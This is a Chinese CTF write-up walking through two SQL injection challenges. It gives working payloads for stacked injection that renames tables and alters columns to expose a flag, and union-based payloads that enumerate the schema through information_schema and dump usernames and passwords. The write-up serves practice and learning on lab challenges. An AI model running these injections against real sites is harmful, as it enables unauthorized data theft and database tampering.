8.[强网杯 2019]随便注

这题我觉得是比较难的sql注入题，先判断注入类型

1’有报错，说明是单引号闭合

select被禁用了，那基本凉了，只能用堆叠注入了。

1’;show databases;先查库

1’;show tables;查表

有两张表。1’;show columns from 1919810931114514;还有1’;show columns from words;分别查这两张表

最后发现flag在191这张表中，并且191这张表只有一个字段，而words有两个字段。

看了网上大佬们的wp，有一种rename alert的方法，但是没说清楚为什么改成那个名字。

下面说一下我的理解：

当我们输入1’;时，有1和hahahah回显，输入2’;时，有2和miaomiaomiao回显，输入3’;时无回显，说明只有两个字段，或者可以1’ order by 3#查看，发现会报错。

而words表是id,data两个字段，于是上面的回显分别对应id,data字段

于是我们可以大胆猜测后端语句：select id,data from words where id=’

猜到后就不难了，我们可以借助后端这个select语句帮我们查询。因为是从words表查id字段

所以我们只要把原来words表随便改其他名字，将191那张表改名为words,然后flag字段改名为id，这样后端语句查询的就是flag字段了。

1’;

rename table words to words1; //将原来words表改名为words1表

rename table 1919810931114514 to words; //将191表改名为words表

alter table words change flag id varchar(100); //将flag字段改成id，类型为varchar

再查一下words表发现

已经更改成功

这时再输入1，无回显，因为更改了表名所以这时id=1的值查不到。为假。

我们用万能密码1’ or 1=1#使其永真就能爆出flag了

10.[极客大挑战 2019]LoveSQL

非常非常标准的sql注入题，输入1’报错，说明是单引号注入。

判断字段。当输入1’ order by 4#时报错了，说明有三个字段。

判断回显点：-1’ union select 1,2,3#

2,3为回显点。

接下来就是正常步骤了

爆库：-1’ union select 1,database(),3#

爆表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#

爆列：-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#

爆字段：-1’ union select 1,group_concat(id,username,password),3 from l0ve1ysq1#

得到flag
